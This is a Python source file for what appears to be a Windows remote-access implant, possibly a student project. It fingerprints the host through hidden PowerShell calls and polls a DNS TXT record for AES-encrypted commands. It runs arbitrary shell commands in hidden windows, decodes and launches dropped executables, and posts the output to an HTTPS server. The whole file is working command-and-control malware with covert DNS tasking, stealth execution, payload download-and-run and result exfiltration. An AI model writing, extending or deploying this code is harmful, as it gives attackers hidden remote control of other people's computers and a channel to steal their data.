import subprocess
import dns.resolver
import requests
import json
import base64
import time
import uuid
import os
import sys
import tempfile
from Crypto.Cipher import AES
from multiprocessing import Process
# AES config (must match server)
AES_KEY = b'mysecretaeskey12'     # 16 bytes
AES_IV = b'initialvector123'      # 16 bytes
DEVICE_ID = None  # Will be set later
CACHE_DIR = os.path.join(tempfile.gettempdir(), ".sysdata")
os.makedirs(CACHE_DIR, exist_ok=True)
LAST_CMD_FILE = os.path.join(CACHE_DIR, "temp.txt")
def get_last_command_id():
    if os.path.exists(LAST_CMD_FILE):
        try:
            with open(LAST_CMD_FILE, 'r') as f:
                return f.read().strip()
        except:
            return None
    return None
def set_last_command_id(cmd_id):
    try:
        with open(LAST_CMD_FILE, 'w') as f:
            f.write(cmd_id)
    except:
        pass
def get_reliable_windows_id():
    try:
        # Hide PowerShell windows by using CREATE_NO_WINDOW flag
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        # Get BIOS Serial Number
        bios_serial_cmd = [
            'powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command',
            "(Get-CimInstance -Class Win32_BIOS).SerialNumber"
        ]
        bios_serial = subprocess.run(
            bios_serial_cmd, 
            capture_output=True, 
            text=True, 
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout.strip()

        # Get System UUID
        uuid_cmd = [
            'powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-Command',
            "(Get-CimInstance -Class Win32_ComputerSystemProduct).UUID"
        ]
        uuid = subprocess.run(
            uuid_cmd, 
            capture_output=True, 
            text=True, 
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout.strip()

        # Handle possible empty results
        if not bios_serial or not uuid:
            raise ValueError("Missing BIOS Serial or UUID")

        return f"{bios_serial}-{uuid}"

    except Exception as e:
        print(f"[ERROR] Unable to get reliable ID: {e}")
        return None
def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + chr(pad_len) * pad_len
def unpad(data):
    pad_len = ord(data[-1])
    return data[:-pad_len]
def decrypt(data):
    raw = base64.b64decode(data)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    decrypted = cipher.decrypt(raw)
    json_data = json.loads(unpad(decrypted.decode()))
    return json_data
def encrypt(data):
    padded = pad(data).encode()
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()
def send_result(data):
    try:
        payload_dict = {
            "device_id": DEVICE_ID,
            "result": data
        }
        encrypted = encrypt(json.dumps(payload_dict))

        payload = {
            "data": encrypted,
            "type": "cmd-result"
        }

        response = requests.post(
            "https://example.com/Project/api",
            json=payload,
            timeout=15
        )

        if response.status_code == 200:
            print("[+] Sent result to HTTPS server.")
        else:
            print("[-] Server responded with error:", response.status_code, response.text)
    except Exception as e:
        print("[-] HTTPS upload failed:", e)
def execute_command(cmd):
    print("[*] Executing:", cmd)
    try:
        # Check if command might execute the current exe to prevent infinite loops
        current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
        current_exe_name = os.path.basename(current_exe)
        
        # If command contains the current exe name, modify execution approach
        if current_exe_name.lower() in cmd.lower() and hasattr(sys, 'frozen'):
            print("[!] Warning: Command might execute current application. Modifying approach...")
            # Execute with detached process to prevent inheritance
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
            )
        else:
            # Hide command windows for normal commands
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        
        output = result.stdout + result.stderr
        send_result(output)
    except Exception as e:
        send_result(f"[!] Command Error: {str(e)}")
def execute_file(data):
    try:
        binary = base64.b64decode(data)
        temp_path = os.path.join(tempfile.gettempdir(), str(uuid.uuid4()) + ".exe")
        with open(temp_path, 'wb') as f:
            f.write(binary)
        print("[*] Executing file:", temp_path)
        
        # Hide windows for executed files and prevent process inheritance
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        subprocess.Popen(
            [temp_path], 
            shell=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
        )
    except Exception as e:
        send_result(f"[!] File execution error: {str(e)}")
def run_command():
    domain = "getcmd.cse-peoject.example.com"
    pingafter = 10  # default fallback

    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            try:
                encrypted_txt = rdata.to_text().strip('"')
                command_data = decrypt(encrypted_txt)

                print("[*] Decrypted Command JSON:\n", json.dumps(command_data, indent=2))

                # Always update pingafter if present
                pingafter = command_data.get("pingafter", pingafter)

                cmd_id = command_data.get("id")
                last_cmd_id = get_last_command_id()

                if not cmd_id or cmd_id == last_cmd_id:
                    print("[-] Skipping duplicate or missing ID:", cmd_id)
                    continue  # Correct indentation here

                set_last_command_id(cmd_id)  # Save after passing check

                # Execute both if present
                cmd = command_data.get("command")
                subprocess_flag = command_data.get("command-subprocess", False)
                if cmd:
                    if subprocess_flag:
                        Process(target=execute_command, args=(cmd,)).start()
                    else:
                        execute_command(cmd)

                exec_file = command_data.get("executable")
                if exec_file:
                    execute_file(exec_file)

            except Exception as e:
                print("[-] Command parse/decrypt failed:", e)

    except Exception as e:
        print("[-] DNS query failed:", e)

    print(f"[*] Sleeping for {pingafter} seconds...\n")
    time.sleep(pingafter)
if __name__ == "__main__":
    DEVICE_ID = get_reliable_windows_id()
    print("[*] Starting advanced DNS command listener...")
    while True:
        print("[*] Checking for commands...")
        run_command()